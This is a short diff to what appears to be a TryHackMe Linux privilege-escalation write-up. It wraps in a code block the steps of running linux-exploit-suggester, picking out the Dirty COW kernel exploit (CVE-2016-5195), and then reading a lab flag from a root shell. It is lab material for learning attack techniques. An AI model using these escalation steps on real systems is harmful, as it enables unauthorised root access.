@@ -447,7 +447,7 @@ after entering
 clone this 
 https://github.com/mzet-/linux-exploit-suggester and use it 
 
-
+```
 ./les.sh > exploits.txt           
 karen@wade7363:/tmp$ cat exploits.txt | grep "high" -B3 -A3
 [+] [CVE-2016-5195] dirtycow
@@ -494,6 +494,7 @@ root@wade7363:/tmp# find / -name flag1.txt 2>/dev/null
 /home/matt/flag1.txt
 root@wade7363:/tmp# cat /home/matt/flag1.txt
 THM-28392872729920
+```
 
 ### PRIVILEGE ESCALATION: SUDO 
 
